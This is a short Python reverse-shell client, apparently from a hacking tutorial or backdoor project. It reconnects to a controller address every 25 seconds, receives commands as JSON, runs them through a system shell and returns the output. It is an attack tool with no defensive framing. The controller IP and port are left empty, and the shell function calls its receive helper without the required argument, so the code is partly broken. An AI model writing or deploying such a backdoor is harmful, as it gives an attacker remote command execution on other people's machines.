import socket
import time
import json
import subprocess

IP = None
PORT = None
def connect(s):
    while(True):
        time.sleep(25)
        try:
            s.connect((str(IP), int(PORT)))
            shell(s)
            s.close()
        except:
            connect(s)

def reliable_send(command, target):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_receive(target):
    data = ""
    while(True):
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            continue
def shell(target):
    while(True):
        command = reliable_receive()
        if command == "exit":
            break
        else:
            execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
            result = execution.stdout.read() + execution.stderr.read()
            result = result.decode()
            reliable_send(result, target)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(s)